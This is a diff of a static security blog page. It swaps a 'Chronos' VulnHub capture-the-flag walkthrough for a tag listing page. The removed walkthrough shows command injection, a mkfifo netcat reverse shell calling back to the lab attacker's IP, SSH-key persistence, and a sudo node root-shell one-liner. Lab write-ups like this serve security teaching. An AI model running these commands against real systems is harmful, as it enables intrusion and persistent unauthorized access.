@@ -3,22 +3,22 @@
 <meta http-equiv="content-type" content="text/html">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title itemprop="name">Chronos - Walkthrough | Null Blog</title>
-<meta property="og:title" content="Chronos - Walkthrough | Null Blog" />
-<meta name="twitter:title" content="Chronos - Walkthrough | Null Blog" />
-<meta itemprop="name" content="Chronos - Walkthrough | Null Blog" />
-<meta name="application-name" content="Chronos - Walkthrough | Null Blog" />
+<title itemprop="name">Password-Reuse | Null Blog</title>
+<meta property="og:title" content="Password-Reuse | Null Blog" />
+<meta name="twitter:title" content="Password-Reuse | Null Blog" />
+<meta itemprop="name" content="Password-Reuse | Null Blog" />
+<meta name="application-name" content="Password-Reuse | Null Blog" />
 <meta property="og:site_name" content="Null Blog" />
 
-<meta name="description" content="Walkthrough for the Chronos machine.">
-<meta itemprop="description" content="Walkthrough for the Chronos machine." />
-<meta property="og:description" content="Walkthrough for the Chronos machine." />
-<meta name="twitter:description" content="Walkthrough for the Chronos machine." />
+<meta name="description" content="CTF writeups, hacking notes, and walkthroughs.">
+<meta itemprop="description" content="CTF writeups, hacking notes, and walkthroughs." />
+<meta property="og:description" content="CTF writeups, hacking notes, and walkthroughs." />
+<meta name="twitter:description" content="CTF writeups, hacking notes, and walkthroughs." />
 
 <meta property="og:locale" content="en-US" />
 <meta name="language" content="en-US" />
 
-  <link rel="alternate" hreflang="en" href="https://nvru.github.io/walkthrough/vulnhub/chronos/" title="" />
+  <link rel="alternate" hreflang="en" href="https://nvru.github.io/tags/password-reuse/" title="" />
 
 
 
@@ -28,33 +28,26 @@
 <meta name="generator" content="Hugo 0.164.0">
 
     
-    <meta property="og:url" content="https://nvru.github.io/walkthrough/vulnhub/chronos/">
+    <meta property="og:url" content="https://nvru.github.io/tags/password-reuse/">
 	<meta property="og:site_name" content="Null Blog">
-	<meta property="og:title" content="Chronos - Walkthrough">
-	<meta property="og:description" content="Walkthrough for the Chronos machine.">
+	<meta property="og:title" content="Password-Reuse">
+	<meta property="og:description" content="CTF writeups, hacking notes, and walkthroughs.">
 	<meta property="og:locale" content="en_US">
-	<meta property="og:type" content="article">
-		<meta property="article:section" content="walkthrough">
-		<meta property="article:published_time" content="2026-07-19T00:00:00+00:00">
-		<meta property="article:modified_time" content="2026-07-19T00:00:00+00:00">
-		<meta property="article:tag" content="Ctf">
-		<meta property="article:tag" content="Walkthrough">
-		<meta property="article:tag" content="Linux">
-		<meta property="article:tag" content="Apache">
-		<meta property="article:tag" content="Nodejs">
-		<meta property="article:tag" content="Command-Injection">
+	<meta property="og:type" content="website">
 
 
     
     
 	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="Chronos - Walkthrough">
-	<meta name="twitter:description" content="Walkthrough for the Chronos machine.">
+	<meta name="twitter:title" content="Password-Reuse">
+	<meta name="twitter:description" content="CTF writeups, hacking notes, and walkthroughs.">
 
 
     
 
-    <link rel="canonical" href="https://nvru.github.io/walkthrough/vulnhub/chronos/">
+    <link rel="canonical" href="https://nvru.github.io/tags/password-reuse/">
+    <link href="/tags/password-reuse/index.xml" rel="alternate" type="application/rss+xml" title="Null Blog">
+    <link href="/tags/password-reuse/index.xml" rel="feed" type="application/rss+xml" title="Null Blog">
     <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
@@ -116,7 +109,7 @@ stroke-linejoin="round" class="feather feather-home">
                 </li>
                 
                 <li>
-                    <a class="menu-link active" href="/walkthrough/">
+                    <a class="menu-link " href="/walkthrough/">
                         Walkthroughs
                     </a>
                     
@@ -172,164 +165,39 @@ stroke-linejoin="round" class="feather feather-home">
         </div>
     </nav>
 </div>
-
-<div class="wrapper post">
+<div class="wrapper list-page">
+    <header class="header">
+        <h1 class="header-title center">Password-Reuse</h1>
+    </header>
     <main class="page-content" aria-label="Content">
-        <article>
-            <header class="header">
-                <h1 class="header-title">Chronos - Walkthrough</h1>
-                
-                
-                
-                <div class="post-meta">
-                    <time datetime="2026-07-19T00:00:00&#43;00:00" itemprop="datePublished"> 19 Jul 2026 </time>
-                </div>
-                
-            </header>
-            
-    
-    <details class="toc" ZgotmplZ>
-        <summary><b>Table of Contents</b></summary>
-        <nav id="TableOfContents">
-  <ul>
-    <li><a href="#overview">Overview</a></li>
-    <li><a href="#port-scanning">Port Scanning</a>
-      <ul>
-        <li><a href="#rustscan">RustScan</a></li>
-        <li><a href="#results">Results</a></li>
-        <li><a href="#nmap-output">Nmap Output</a></li>
-      </ul>
-    </li>
-  </ul>
+        
+        
+        <h2 class="post-year">2026</h2>
 
-  <ul>
-    <li><a href="#apache-web-server">Apache Web Server</a></li>
-    <li><a href="#command-injection">Command Injection</a></li>
-    <li><a href="#privilege-escalation">Privilege Escalation</a>
-      <ul>
-        <li><a href="#www-data--imera">www-data → imera</a></li>
-        <li><a href="#stabilizing-the-shell">Stabilizing the Shell</a></li>
-        <li><a href="#imera--root">imera → root</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-    </details>
-            <div class="page-content">
-                <h1 id="chronos---walkthrough">Chronos - Walkthrough</h1>
-<h2 id="overview">Overview</h2>
-<ul>
-<li><strong>Attacker IP:</strong> <code>10.151.249.142</code></li>
-<li><strong>Target Machine IP:</strong> <code>10.151.249.111</code></li>
-</ul>
-<p>The objective was to enumerate the target, identify exposed services, gain initial access through a <strong>command injection vulnerability</strong>, and escalate privileges by exploiting a vulnerable <strong>express-fileupload</strong> application running on an internal service.</p>
-<p><img src="/images/vulnhub/chronos/vm.png" alt="Machine information"></p>
-<hr>
-<h2 id="port-scanning">Port Scanning</h2>
-<h3 id="rustscan">RustScan</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rustscan -a 10.151.249.111
-</span></span></code></pre></div><h3 id="results">Results</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Open 10.151.249.111:22
-</span></span><span style="display:flex;"><span>Open 10.151.249.111:80
-</span></span><span style="display:flex;"><span>Open 10.151.249.111:8000
-</span></span></code></pre></div><p>To gather additional information, I performed a full Nmap scan.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sSCV -A -p22,80,3306,8080 -oN nmap/ports 10.151.249.111
-</span></span></code></pre></div><h3 id="nmap-output">Nmap Output</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-26 00:07 +0200
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Nmap scan report for 10.151.249.111
-</span></span><span style="display:flex;"><span>Host is up (0.00030s latency).
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>PORT     STATE  SERVICE    VERSION
-</span></span><span style="display:flex;"><span>22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
-</span></span><span style="display:flex;"><span>80/tcp   open   http       Apache httpd 2.4.29 ((Ubuntu))
-</span></span><span style="display:flex;"><span>3306/tcp closed mysql
-</span></span><span style="display:flex;"><span>8080/tcp closed http-proxy
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Service Info: OS: Linux
-</span></span></code></pre></div><p>Only SSH and Apache were publicly accessible, so web enumeration became the next step.</p>
-<hr>
-<h1 id="enumeration">Enumeration</h1>
-<h2 id="apache-web-server">Apache Web Server</h2>
-<p>Browsing to the web server initially displayed a simple page showing only the text <strong>&ldquo;Chronos&rdquo;</strong> in a custom font.</p>
-<p><img src="/images/vulnhub/chronos/http.png" alt="Http"></p>
-<p>Viewing the page source revealed an interesting virtual host:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>chrono.local
-</span></span></code></pre></div><p>After adding the hostname to my <code>/etc/hosts</code> file, the website changed and loaded the actual application. This page displayed the current date and time.</p>
-<p>Inspecting the browser&rsquo;s <strong>Developer Tools</strong> showed that the application retrieved the time using the following endpoint:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/date?format=base58
-</span></span></code></pre></div><p>The <code>format</code> parameter immediately stood out because its value appeared to be passed directly to the backend without proper validation, making it a good candidate for command injection testing.</p>
-<hr>
-<h2 id="command-injection">Command Injection</h2>
-<p>To verify my suspicion, I began testing the <code>format</code> parameter with simple command injection payloads. The application executed the supplied commands, confirming the vulnerability.</p>
-<p>After confirming code execution, I attempted to obtain a reverse shell. A standard Netcat payload failed, likely because the target&rsquo;s version of <code>nc</code> did not support the required options.</p>
-<p>I then switched to the classic <code>mkfifo</code> reverse shell payload.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2&gt;&amp;<span style="color:#ae81ff">1</span> | nc 10.151.249.142 <span style="color:#ae81ff">9001</span> &gt;/tmp/f
-</span></span></code></pre></div><p>This payload successfully connected back to my listener and provided a shell as the <code>www-data</code> user.</p>
-<hr>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="www-data--imera">www-data → imera</h3>
-<p>Checking sudo permissions showed that <code>www-data</code> had no useful privileges.</p>
-<p>While enumerating the system, I noticed a service listening only on localhost.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>127.0.0.1:8080
-</span></span></code></pre></div><p>I forwarded the port to my attacking machine using <code>socat</code>.</p>
-<p><img src="/images/vulnhub/chronos/socat.png" alt="Port Forwarding"></p>
-<p>After opening the forwarded port in the browser, the page simply displayed:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Coming Soon...
-</span></span></code></pre></div><p><img src="/images/vulnhub/chronos/co_soon.png" alt="Coming Soon"></p>
-<p>Searching the filesystem for this string quickly located the application&rsquo;s source code.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -R <span style="color:#e6db74">&#34;Coming Soon&#34;</span> /opt
-</span></span></code></pre></div><p><img src="/images/vulnhub/chronos/opt.png" alt="Searching /opt"></p>
-<p>The search pointed to an <code>index.js</code> file.</p>
-<p>Inspecting it revealed the application was using the vulnerable <strong>express-fileupload</strong> package.</p>
-<p><img src="/images/vulnhub/chronos/serv_js.png" alt="Application Source"></p>
-<p>Searching for public exploits led to a known exploit for this vulnerable version.</p>
-<p><img src="/images/vulnhub/chronos/exp_git.png" alt="Exploit Reference"></p>
-<p>Executing the exploit successfully provided a shell as <strong>imera</strong>.</p>
-<p><img src="/images/vulnhub/chronos/rev_imera.png" alt="Shell as imera"></p>
-<hr>
-<h3 id="stabilizing-the-shell">Stabilizing the Shell</h3>
-<p>To obtain a fully interactive shell, I upgraded the TTY.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
-</span></span></code></pre></div><p>After backgrounding the shell:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>stty raw -echo; fg
-</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm
-</span></span></code></pre></div><p>To maintain persistent access, I added my public SSH key.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir ~/.ssh
-</span></span><span style="display:flex;"><span>vi ~/.ssh/authorized_keys
-</span></span></code></pre></div><p>I was then able to connect directly through SSH.</p>
-<p><img src="/images/vulnhub/chronos/ssh_imera.png" alt="SSH as imera"></p>
-<hr>
-<h3 id="imera--root">imera → root</h3>
-<p>After obtaining access as <code>imera</code>, I checked the user&rsquo;s sudo permissions.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
-</span></span></code></pre></div><p>The output showed that <code>imera</code> could execute both <code>node</code> and <code>npm</code> as <strong>root</strong> without requiring a password.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>(ALL) NOPASSWD: /usr/local/bin/npm *
-</span></span><span style="display:flex;"><span>(ALL) NOPASSWD: /usr/local/bin/node *
-</span></span></code></pre></div><p>Since <code>node</code> can execute arbitrary JavaScript code, this effectively allows arbitrary command execution as the root user.</p>
-<p>A root shell can be spawned directly using Node&rsquo;s <code>child_process</code> module:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/local/bin/node -e <span style="color:#e6db74">&#39;require(&#34;child_process&#34;).spawn(&#34;/bin/sh&#34;,{stdio:[0,1,2]})&#39;</span>
-</span></span></code></pre></div><p><img src="/images/vulnhub/chronos/sudo_perm_imera.png" alt="Sudo Permissions"></p>
-<p>Executing the command immediately spawned a root shell, completing the privilege escalation.</p>
-<hr>
-<h1 id="flags">Flags</h1>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>user.txt
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Decoded:
-</span></span><span style="display:flex;"><span>o chronos pernaei file mou
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root.txt
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Decoded:
-</span></span><span style="display:flex;"><span>apopse siopi mazeuoume oneira
-</span></span></code></pre></div>
-            </div>
-        </article></main>
-</div>
-<footer class="footer">
+        
+
+        
+
+        <article class="post-item">
+    <h4 class="post-item-title">
+        <a href="/walkthrough/vulnhub/who_wants_to_be_king1/">Who Wants to Be King? 1 - Walkthrough</a>
+    </h4>
+    
+    
+    
+    
+    <time class="post-item-meta" datetime="2026-07-20T00:00:00Z">
+        20 Jul 2026
+    </time>
+</article>
+
+
+         
+
+         
+
+    </main>
+</div><footer class="footer">
     <span class="footer_item"> </span>
     &nbsp;
 
